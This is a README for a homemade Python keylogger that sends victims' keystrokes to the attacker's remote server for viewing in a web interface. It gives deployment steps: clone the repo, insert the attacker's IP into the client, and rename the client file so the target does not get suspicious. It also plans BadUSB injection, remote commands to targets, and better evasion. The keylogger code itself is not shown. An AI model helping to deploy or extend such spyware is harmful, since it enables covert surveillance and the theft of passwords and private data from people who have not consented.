# Keylogger

A keylogger made to send keystrokes to a remote server for it to then be accessed from a web interface.

There are many things to work on including mainly reliability but I am overall pretty happy with it. Dont expect some kind of crazy UI or functions, this is really bare bones and I made it for the sole purpose of leveling up my python skills. I also found the idea really neat and coudlnt find a good alternative ... so I made my own one.

It all started when I was looking into botnets and how to make my own one, but I quickly found out that the only ones that I had access to (at the time) was BYOB and Covenant. BYOB was outdated, was a pain to set up, didnt work and the comunity also gave up after trying to consult my problem in the discord. Covenant did work really nicely (when setting up) tho it was lacking features BYOB had and didnt work for me. So I decided to start with a keylogger. I (probbably) will make more of these tools like this keylogger and eventually will put it into a one big interface. But that has years to come sinc i still need to start and finish high school. :/

# Future updates

More reliable and secure connection

Two way interactions (so you can write, modify, send commands to the targets for them to then behave like that (Ex. Stop for 15 min))

Having a BadUSB payload to inject the malware

Better UI (in desperate need please some could help me i am terrible at it)

Improved its under-the-radar ability (windows updated in the future may brick it)


# How to set up:

SSH into your remote server and cd into the home directory

Then clone the project with

    git clone https://github.com/Gablak/keylogger
    
Cd into keylogger dir

    cd keylogger

Cd into client dir

    cd Client

Edit target.py with nano

    sudo nano target.py

When in nano scroll down until you see "YOUR IP HERE" and replace it with your public IP address

Then exit nano with
Ctrl + S,
Ctrl + X,
Y,
ENTER

    cd ..
    
    python3.12 installme.py

Wait until all dependencies are finished installing. If it propmts you to update pip or you see some errors just update pip as it tells you and run the script again. If it still gives errors ignore it for now.

    cd Client

Now rename the target.py script so that the target doesnt get suspicious about anything.

    mv target.py ANY_NAME_HERE.py

# You will need:

Linux server (RPI2 works well enough)

Central computer (Your personal just for setting up)

Internet connection (Preferably wired)

Ability to port forward (Ik but there isnt a better way rn)

Python 3.12 installed on the server (I will not show how to install python so do it yourself)

 

Optional:

USB flash drive (To load your keylogger onto a target machine physicaly)

USB RubberDucky (Also an option instead of a flash drive)

Third PC (If you can it is recomended to test everything out)   
    
